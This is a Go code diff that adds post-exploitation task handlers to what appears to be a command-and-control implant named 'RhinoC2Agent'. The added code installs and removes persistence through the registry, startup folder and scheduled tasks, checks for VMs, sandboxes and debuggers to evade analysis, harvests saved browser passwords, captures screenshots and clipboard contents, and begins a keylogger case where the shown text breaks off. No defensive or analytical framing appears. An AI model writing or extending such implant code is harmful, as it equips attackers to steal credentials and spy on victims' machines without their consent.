@@ -178,3 +178,73 @@ func (a *Agent) handleTask(task map[string]interface{}) {
 
 	case "persist":
 		switch args {
+		case "registry":
+			err = a.persistence.InstallRegistry("RhinoC2Agent")
+		case "startup":
+			err = a.persistence.InstallStartupFolder("RhinoC2Agent")
+		case "schtask":
+			err = a.persistence.InstallScheduledTask("RhinoC2Agent", 5)
+		}
+		if err != nil {
+			result = "persistence install failed: " + err.Error()
+		} else {
+			result = fmt.Sprintf("persistence installed: %s", args)
+		}
+
+	case "unpersist":
+		switch args {
+		case "registry":
+			err = a.persistence.RemoveRegistry("RhinoC2Agent")
+		case "startup":
+			err = a.persistence.RemoveStartupFolder("RhinoC2Agent")
+		case "schtask":
+			err = a.persistence.RemoveScheduledTask("RhinoC2Agent")
+		}
+		if err != nil {
+			result = fmt.Sprintf("couldn't remove persistence: %v", err)
+		} else {
+			result = fmt.Sprintf("persistence removed: %s", args)
+		}
+
+	case "check_evasion":
+		if a.evasion.CheckVM() {
+			result += "VM detected\n"
+		}
+		if a.evasion.CheckSandbox() {
+			result += "Sandbox detected\n"
+		}
+		if a.evasion.CheckDebugger() {
+			result += "Debugger detected\n"
+		}
+		if result == "" {
+			result = "no threats detected"
+		}
+
+	case "harvest_creds":
+		creds, err := a.credHarvest.BrowserPasswords()
+		if err != nil {
+			result = "credential harvest failed: " + err.Error()
+		} else {
+			data, _ := json.Marshal(creds)
+			result = string(data)
+		}
+
+	case "screenshot":
+		sc := postexploit.NewScreenCapture(commands.GetTempDir())
+		filename, err := sc.TakeScreenshot()
+		if err != nil {
+			result = "screenshot failed: " + err.Error()
+		} else {
+			imgData, _ := a.fileMgr.ReadFileBase64(filename)
+			result = imgData
+		}
+
+	case "clipboard":
+		clip, err := postexploit.GetClipboard()
+		if err != nil {
+			result = err.Error()
+		} else {
+			result = clip
+		}
+
+	case "keylog_start":
